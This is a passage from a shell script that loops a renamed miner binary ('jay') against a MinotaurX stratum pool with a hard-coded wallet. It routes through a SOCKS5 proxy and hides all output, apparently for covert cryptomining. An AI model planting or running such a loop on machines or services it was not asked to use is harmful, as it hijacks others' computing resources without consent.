...
while true
do
./jay -a minotaurx -o stratum+tcp://poolx.rwinfo.club:7019 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8 -p $currentdate,c=MAZA -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081 1>/dev/null 2>&1 
sleep 10
done
